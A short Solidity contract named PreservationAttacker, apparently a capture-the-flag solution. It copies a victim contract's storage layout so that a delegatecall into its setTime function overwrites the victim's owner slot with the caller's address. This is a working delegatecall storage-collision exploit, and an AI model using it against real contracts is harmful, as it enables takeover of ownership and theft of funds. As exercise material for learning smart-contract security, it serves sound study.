// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract PreservationAttacker{    
  address public timeZone1Library;    
  address public timeZone2Library;    
  address public owner;    // delegatecall to this function to modify state stored in slot 2 in the calling contract    
  function setTime(uint _time) public {        
    owner = msg.sender;    
  }
}